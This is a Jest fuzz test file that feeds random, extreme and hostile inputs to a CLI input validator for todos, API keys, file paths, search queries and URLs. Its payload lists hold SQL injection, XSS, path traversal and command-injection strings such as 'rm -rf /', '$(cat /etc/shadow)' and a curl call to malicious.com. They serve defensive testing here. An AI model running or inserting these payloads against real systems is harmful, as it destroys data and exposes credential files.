/* eslint-disable jest/no-conditional-expect */
import { InputValidator } from '../../apps/cli/src/utils/InputValidator';
import { ValidationError } from '../../apps/cli/src/types/errors/consolidated/ValidationError';

describe('Input Validation Fuzzer', () => {
  let validator: InputValidator;
  const iterations = 1000; // Number of random inputs per test

  beforeEach(() => {
    validator = new InputValidator();
  });

  // Helper functions to generate random inputs
  const generateRandomString = (length: number): string => {
    const chars =
      'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:,.<>?';
    let result = '';
    for (let i = 0; i < length; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  };

  const generateMaliciousString = (): string => {
    const maliciousPatterns = [
      // SQL Injection patterns
      "'; DROP TABLE todos; --",
      "1' OR '1'='1",
      'UNION SELECT * FROM users--',
      "'; DELETE FROM todos WHERE '1'='1",

      // XSS patterns
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      "javascript:alert('XSS')",
      '<iframe src=\'javascript:alert("XSS")\'></iframe>',

      // Command injection patterns
      '; rm -rf /',
      '| cat /etc/passwd',
      '&& curl http://malicious.com',
      '`whoami`',
      '$(cat /etc/shadow)',

      // Path traversal patterns
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      'file:///etc/passwd',
      '\\\\server\\share\\file',

      // Unicode/encoding attacks
      '\u0000\u0001\u0002',
      '\uFEFF',
      '\u202E',
      '%00',
      '%0A%0D',

      // Format string attacks
      '%s%s%s%s%s%s%s%s%s%s',
      '%x%x%x%x%x%x%x%x',
      '%n%n%n%n%n',

      // LDAP injection
      '*)(&(objectClass=*',
      ')(cn=*))',

      // NoSQL injection
      "{'$ne': null}",
      "{'$gt': ''}",
      "{'$regex': '.*'}",
    ];

    return maliciousPatterns[
      Math.floor(Math.random() * maliciousPatterns.length)
    ];
  };

  const generateRandomType = (): unknown => {
    const types = [
      null,
      undefined,
      true,
      false,
      0,
      -1,
      1,
      3.14159,
      -Infinity,
      Infinity,
      NaN,
      '',
      [],
      {},
      new Date(),
      () => {},
      Symbol('test'),
      BigInt(9007199254740991),
    ];

    return types[Math.floor(Math.random() * types.length)];
  };

  const generateExtremeString = (): string => {
    const patterns = [
      // Extremely long strings
      'A'.repeat(10000),

      // Empty and whitespace
      '',
      ' ',
      '\t',
      '\n',
      '\r\n',
      '   \t\n\r   ',

      // Special characters
      '🚀🌟✨',
      '中文字符',
      'العربية',
      'ñáéíóú',
      '\u0000',
      '\uFFFF',

      // Control characters
      '\x00\x01\x02\x03',
      '\b\t\n\v\f\r',

      // Mixed patterns
      'normal' + '\x00' + 'text',
      'test\nwith\nnewlines',
      'tabs\there\tand\tthere',
    ];

    return patterns[Math.floor(Math.random() * patterns.length)];
  };

  describe('validateTodoInput', () => {
    it('should handle random string inputs', () => {
      for (let i = 0; i < iterations; i++) {
        const length = Math.floor(Math.random() * 1000);
        const input = generateRandomString(length);

        try {
          const result = validator.validateTodoInput(input);
          // Valid inputs should be sanitized
          expect(result).toBeDefined();
          expect(typeof result).toBe('string');
          // Should not contain dangerous patterns
          expect(result).not.toContain('<script>');
          expect(result).not.toContain('javascript:');
        } catch (error) {
          // Invalid inputs should throw ValidationError
          expect(error).toBeInstanceOf(ValidationError);
        }
      }
    });

    it('should handle malicious inputs', () => {
      for (let i = 0; i < iterations; i++) {
        const input = generateMaliciousString();

        try {
          const result = validator.validateTodoInput(input);
          // If it passes, ensure dangerous content is sanitized
          expect(result).not.toContain('DROP TABLE');
          expect(result).not.toContain('DELETE FROM');
          expect(result).not.toContain('<script>');
          expect(result).not.toContain('javascript:');
          expect(result).not.toContain('../');
          expect(result).not.toContain('rm -rf');
        } catch (error) {
          // Many malicious inputs should be rejected
          expect(error).toBeInstanceOf(ValidationError);
        }
      }
    });

    it('should handle extreme edge cases', () => {
      for (let i = 0; i < iterations; i++) {
        const input = generateExtremeString();

        try {
          const result = validator.validateTodoInput(input);
          expect(result).toBeDefined();
          expect(typeof result).toBe('string');
          // Should handle unicode properly
          if (input.includes('🚀')) {
            expect(result).toContain('🚀');
          }
        } catch (error) {
          expect(error).toBeInstanceOf(ValidationError);
        }
      }
    });

    it('should handle various invalid types', () => {
      for (let i = 0; i < iterations; i++) {
        const input = generateRandomType();

        if (typeof input !== 'string') {
          expect(() => validator.validateTodoInput(input)).toThrow(
            ValidationError
          );
        }
      }
    });
  });

  describe('validateApiKey', () => {
    it('should handle random API key formats', () => {
      for (let i = 0; i < iterations; i++) {
        const prefix = ['xai-', 'sk-', 'api-', ''][
          Math.floor(Math.random() * 4)
        ];
        const length = Math.floor(Math.random() * 100);
        const key = prefix + generateRandomString(length);

        try {
          const result = validator.validateApiKey(key);
          expect(result).toBeDefined();
          expect(typeof result).toBe('string');
          // Valid keys should match specific patterns
          expect(result).toMatch(/^(xai-|sk-)[A-Za-z0-9]{32,}$/);
        } catch (error) {
          expect(error).toBeInstanceOf(ValidationError);
        }
      }
    });

    it('should reject malicious API keys', () => {
      for (let i = 0; i < iterations; i++) {
        const maliciousKey = 'xai-' + generateMaliciousString();

        expect(() => validator.validateApiKey(maliciousKey)).toThrow(
          ValidationError
        );
      }
    });
  });

  describe('validateFilePath', () => {
    it('should handle random file paths', () => {
      const extensions = ['.txt', '.json', '.md', '.log', '.tmp', ''];
      const separators = ['/', '\\', '//', '\\\\'];

      for (let i = 0; i < iterations; i++) {
        const depth = Math.floor(Math.random() * 10);
        const separator =
          separators[Math.floor(Math.random() * separators.length)];
        const extension =
          extensions[Math.floor(Math.random() * extensions.length)];

        let path = '';
        for (let j = 0; j < depth; j++) {
          path += generateRandomString(10) + separator;
        }
        path += generateRandomString(10) + extension;

        try {
          const result = validator.validateFilePath(path);
          expect(result).toBeDefined();
          expect(typeof result).toBe('string');
          // Should not contain path traversal
          expect(result).not.toContain('..');
          expect(result).not.toContain('~');
        } catch (error) {
          expect(error).toBeInstanceOf(ValidationError);
        }
      }
    });

    it('should reject path traversal attempts', () => {
      const traversalPatterns = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32',
        '/etc/../etc/passwd',
        'C:\\..\\..\\Windows\\System32',
        '~/../../root',
        'file:///etc/passwd',
        '\\\\server\\share\\..\\admin$',
      ];

      for (const pattern of traversalPatterns) {
        expect(() => validator.validateFilePath(pattern)).toThrow(
          ValidationError
        );
      }
    });
  });

  describe('validateSearchQuery', () => {
    it('should handle random search queries', () => {
      for (let i = 0; i < iterations; i++) {
        const query = generateRandomString(Math.floor(Math.random() * 200));

        try {
          const result = validator.validateSearchQuery(query);
          expect(result).toBeDefined();
          expect(typeof result).toBe('string');
          // Should sanitize special regex characters
          const hasSpecialChars =
            query.includes('*') || query.includes('?') || query.includes('[');
          if (hasSpecialChars) {
            expect(result).not.toMatch(/[*?[\]]/);
          }
        } catch (error) {
          expect(error).toBeInstanceOf(ValidationError);
        }
      }
    });

    it('should handle regex injection attempts', () => {
      const regexPatterns = [
        '.*',
        '.+',
        '^.*$',
        '(a+)+$',
        '(?i)password',
        '[a-zA-Z0-9]*',
        '\\w+',
        '(?=.*[a-z])(?=.*[A-Z])',
      ];

      for (const pattern of regexPatterns) {
        const result = validator.validateSearchQuery(pattern);
        // Should escape regex special characters
        expect(result).not.toContain('.*');
        expect(result).not.toContain('.+');
        expect(result).not.toContain('(?');
      }
    });
  });

  describe('validateBatchSize', () => {
    it('should handle random numeric inputs', () => {
      for (let i = 0; i < iterations; i++) {
        const value = Math.random() * 10000 - 5000; // Random between -5000 and 5000

        try {
          const result = validator.validateBatchSize(value);
          expect(result).toBeGreaterThan(0);
          expect(result).toBeLessThanOrEqual(1000); // Assuming max batch size
          expect(Number.isInteger(result)).toBe(true);
        } catch (error) {
          expect(error).toBeInstanceOf(ValidationError);
        }
      }
    });

    it('should reject invalid numeric values', () => {
      const invalidValues = [
        NaN,
        Infinity,
        -Infinity,
        null,
        undefined,
        'not a number',
        {},
        [],
        true,
        false,
      ];

      for (const value of invalidValues) {
        expect(() =>
          validator.validateBatchSize(value as unknown as number)
        ).toThrow(ValidationError);
      }
    });
  });

  describe('validateUrl', () => {
    it('should handle random URL-like strings', () => {
      const protocols = ['http://', 'https://', 'ftp://', 'file://', ''];
      const tlds = ['.com', '.org', '.net', '.edu', '.invalid', ''];

      for (let i = 0; i < iterations; i++) {
        const protocol =
          protocols[Math.floor(Math.random() * protocols.length)];
        const domain = generateRandomString(10);
        const tld = tlds[Math.floor(Math.random() * tlds.length)];
        const path = '/' + generateRandomString(20);
        const url = protocol + domain + tld + path;

        try {
          const result = validator.validateUrl(url);
          expect(result).toBeDefined();
          expect(typeof result).toBe('string');
          // Should be a valid URL format
          expect(() => new URL(result)).not.toThrow();
        } catch (error) {
          expect(error).toBeInstanceOf(ValidationError);
        }
      }
    });

    it('should reject malicious URLs', () => {
      const maliciousUrls = [
        'javascript:alert("XSS")',
        'data:text/html,<script>alert("XSS")</script>',
        'vbscript:msgbox("XSS")',
        'file:///etc/passwd',
        'ftp://user:pass@evil.com',
        'http://[::1]:8080/admin',
        'https://evil.com/<script>',
        'http://localhost:22/ssh',
      ];

      for (const url of maliciousUrls) {
        expect(() => validator.validateUrl(url)).toThrow(ValidationError);
      }
    });
  });

  describe('concurrent validation stress test', () => {
    it('should handle multiple validations concurrently', async () => {
      const validations = [];

      for (let i = 0; i < 100; i++) {
        // Create different types of validations
        validations.push(
          Promise.resolve()
            .then(() => validator.validateTodoInput(generateRandomString(100)))
            .catch(() => null),

          Promise.resolve()
            .then(() =>
              validator.validateApiKey('xai-' + generateRandomString(40))
            )
            .catch(() => null),

          Promise.resolve()
            .then(() =>
              validator.validateFilePath('/tmp/' + generateRandomString(20))
            )
            .catch(() => null),

          Promise.resolve()
            .then(() => validator.validateSearchQuery(generateRandomString(50)))
            .catch(() => null),

          Promise.resolve()
            .then(() =>
              validator.validateBatchSize(Math.floor(Math.random() * 100))
            )
            .catch(() => null)
        );
      }

      // Run all validations concurrently
      const results = await Promise.all(validations);

      // Should complete without crashing
      expect(results).toHaveLength(500);
    });
  });
});
